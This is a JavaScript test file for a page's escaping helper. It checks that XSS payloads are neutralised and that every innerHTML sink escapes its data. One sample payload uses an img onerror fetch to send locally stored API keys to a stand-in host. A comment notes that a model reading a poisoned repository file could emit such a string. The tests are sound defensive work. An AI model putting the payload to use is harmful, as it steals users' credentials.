import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const html = fs.readFileSync(path.join(root, 'public/index.html'), 'utf8');

/** Pull the escaping helper out of the page and exercise it directly. */
function loadEsc() {
  const m = html.match(/const esc = \(s\) => String\(s \?\? ''\)\.replace\([\s\S]*?\}\[ch\]\)\);/);
  assert.ok(m, 'the page must define an esc() helper');
  // eslint-disable-next-line no-new-func
  return new Function(`${m[0]} return esc;`)();
}

test('esc neutralises every character that can break out of markup', () => {
  const esc = loadEsc();
  assert.equal(esc('<img src=x onerror=alert(1)>'), '&lt;img src=x onerror=alert(1)&gt;');
  assert.equal(esc('" onmouseover="steal()'), '&quot; onmouseover=&quot;steal()');
  assert.equal(esc("' onfocus='x"), '&#39; onfocus=&#39;x');
  assert.equal(esc('a & b'), 'a &amp; b');
  assert.equal(esc(null), '');
  assert.equal(esc(undefined), '');
});

test('a malicious tool argument cannot inject markup into the trace', () => {
  const esc = loadEsc();
  // A model that has read a poisoned repo file could emit this as a file path.
  const evil = '<img src=x onerror="fetch(`//e.co?k=${localStorage.getItem(`ollyai.keys.v1`)}`)">';
  const rendered = `<span class="d">${esc(evil)}</span>`;
  assert.ok(!rendered.includes('<img'), 'the tag must not survive escaping');
  assert.ok(!/onerror=["'][^&]/.test(rendered), 'the handler must not survive escaping');
  assert.ok(rendered.includes('&lt;img'), 'it should render as visible text instead');
});

/**
 * Every value interpolated into innerHTML must be escaped. Walks each
 * `innerHTML = ...;` statement and checks the expressions inside it, so a new
 * unescaped sink fails the build rather than shipping.
 */
test('no innerHTML sink interpolates unescaped data', () => {
  const failures = [];
  const re = /innerHTML\s*=\s*/g;
  let m;
  while ((m = re.exec(html))) {
    // Take the statement: from here to the first `;` at depth zero.
    let i = m.index + m[0].length;
    let depth = 0;
    const start = i;
    for (; i < html.length; i += 1) {
      const ch = html[i];
      if ('([{'.includes(ch)) depth += 1;
      else if (')]}'.includes(ch)) depth -= 1;
      else if (ch === ';' && depth <= 0) break;
    }
    const stmt = html.slice(start, i);

    for (const expr of stmt.matchAll(/\$\{([^}]*(?:\{[^}]*\}[^}]*)*)\}/g)) {
      const e = expr[1].trim();
      // A ternary is safe when both branches are string literals, whatever the
      // condition tests - no external value reaches the output.
      const literalTernary = /\?\s*'[^']*'\s*:\s*'[^']*'$/.test(e.replace(/\s+/g, ' '));
      const safe =
        e.startsWith('esc(') ||
        e.startsWith('render(') ||
        literalTernary ||
        /toFixed\(\d\)$/.test(e) ||                  // formatted number
        // Fragments the caller has already escaped before assembling them.
        /^(fo|trace|br|cls|metaHtml)$/.test(e);
      if (!safe) failures.push(e.slice(0, 80));
    }
  }
  assert.deepEqual(failures, [], `unescaped interpolation(s) into innerHTML:\n  ${failures.join('\n  ')}`);
});
